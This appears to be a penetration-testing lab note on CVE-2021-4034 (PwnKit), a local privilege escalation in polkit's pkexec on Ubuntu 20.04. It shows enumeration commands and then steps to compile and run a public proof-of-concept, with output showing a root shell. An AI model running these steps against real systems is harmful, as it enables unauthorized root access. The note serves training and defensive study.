# CVE-2021-4034 - Linux - PwnKit - Local Privilege Escalation

## Enumeration

```bash
$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"
```

```bash
$ uname -a

Linux ubuntu 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
$ pkexec --version

pkexec version 0.105
```

```bash
$ which pkexec
/usr/bin/pkexec

$ ls -lha /usr/bin/pkexec
-rwsr-xr-x 1 root root 23K Jul 14  2021 /usr/bin/pkexec
```

As the vulnerability was detected at the end of 2021, we could also check if the version we have is before Dec 2021.

## Exploitation

Compile and run [cve-2021-4034-poc.c](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)

```bash
$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
$ ./cve-2021-4034-poc 

# id
uid=0(root) gid=0(root) groups=0(root),1001(htb-student)
```

## Links

- [SecList - pwnkit](https://seclists.org/oss-sec/2022/q1/80)
- [Qualys - pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [GitHub - PoC - arthepsy](https://github.com/arthepsy/CVE-2021-4034)
- [HTB Pressed machine](https://app.hackthebox.com/machines/440)
